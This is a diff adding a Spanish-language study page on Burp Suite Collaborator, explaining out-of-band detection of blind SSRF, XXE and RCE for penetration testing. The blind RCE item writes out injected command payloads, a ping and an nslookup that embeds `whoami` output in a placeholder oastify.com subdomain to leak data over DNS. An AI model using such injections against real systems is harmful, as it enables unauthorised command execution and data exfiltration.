@@ -69,6 +69,11 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
+        
+        <a href="#resumen-operativo-del-modulo" class="md-skip">
+          Saltar a contenido
+        </a>
+      
     </div>
     <div data-md-component="announce">
       
@@ -530,6 +535,47 @@
   
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Tabla de contenidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#resumen-operativo-del-modulo" class="md-nav__link">
+    <span class="md-ellipsis">
+      📌 Resumen Operativo del Módulo
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="📌 Resumen Operativo del Módulo">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#mecanismo-de-accion" class="md-nav__link">
+    <span class="md-ellipsis">
+      🧩 Mecanismo de Acción:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#principales-vectores-de-ataque-detectados" class="md-nav__link">
+    <span class="md-ellipsis">
+      🚀 Principales Vectores de Ataque Detectados
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -546,6 +592,28 @@
 
   <h1>06. Collaborator</h1>
 
+<blockquote>
+<p>⚠️ <strong>Nota de Licencia:</strong> Este módulo es exclusivo de la versión <strong>Burp Suite Professional</strong>. No se encuentra disponible ni es visible en la versión Community (gratuita).</p>
+</blockquote>
+<hr />
+<h2 id="resumen-operativo-del-modulo">📌 Resumen Operativo del Módulo</h2>
+<p><strong>Burp Collaborator</strong> es un servidor intermediario gestionado en la nube que sirve para identificar vulnerabilidades <strong>Out-of-Band (OOB)</strong> o "a ciegas" (<em>Blind</em>), donde el servidor de la víctima procesa nuestros payloads de forma interna pero nunca devuelve una respuesta visible en la interfaz web.</p>
+<p><img alt="Collaborator" src="../Collaborator.png" /></p>
+<h3 id="mecanismo-de-accion">🧩 Mecanismo de Acción:</h3>
+<ol>
+<li><strong>Generación:</strong> Burp te proporciona un subdominio único, aleatorio e indetectable (ej: <code>xyz123...oastify.com</code>).</li>
+<li><strong>Inyección:</strong> Introduces este subdominio en parámetros sospechosos de la aplicación web (como campos de carga de URLs, importación de XML o cabeceras).</li>
+<li><strong>Intercepción:</strong> Si la aplicación web de la víctima es vulnerable, intentará resolver el dominio o conectarse a él. Burp Collaborator atrapa esa interacción externa (DNS, HTTP/S o SMTP) y te la notifica en su panel, sirviendo como prueba irrefutable de la vulnerabilidad.</li>
+</ol>
+<hr />
+<h2 id="principales-vectores-de-ataque-detectados">🚀 Principales Vectores de Ataque Detectados</h2>
+<ul>
+<li><strong>SSRF a ciegas (Blind Server-Side Request Forgery):</strong> Se confirma cuando el servidor de la víctima muerde el anzuelo y realiza una petición HTTP/S hacia el subdominio de Collaborator, demostrando que puede ser forzado a interactuar con infraestructura externa o interna.</li>
+<li><strong>XXE a ciegas (Blind XML External Entity):</strong> Ocurre cuando el procesador XML de la aplicación resuelve entidades externas dirigidas al dominio de Collaborator, permitiendo la posterior exfiltración de archivos del sistema a través de las peticiones DNS/HTTP.</li>
+<li><strong>RCE a ciegas (Blind Remote Code Execution):</strong> Utilizado cuando ejecutas comandos en el sistema pero no ves el <em>output</em> en pantalla. Forzar un comando como <code>; ping xyz123.oastify.com</code> o <code>; nslookup \</code>whoami`.xyz123.oastify.com` generará una interacción en el panel que confirmará la ejecución del código y permitirá extraer datos (como el nombre del usuario del sistema) dentro del propio tráfico de red.</li>
+</ul>
+<hr />
+<p><a href="../../Herramientas%20-%20Auditor%C3%ADa%20y%20An%C3%A1lisis%20Web%20con%20Burp%20Suite/">⬅️ Volver a Burp Suite</a></p>
 
 
 
@@ -553,6 +621,8 @@
 
 
 
+  
+  
 
 
 
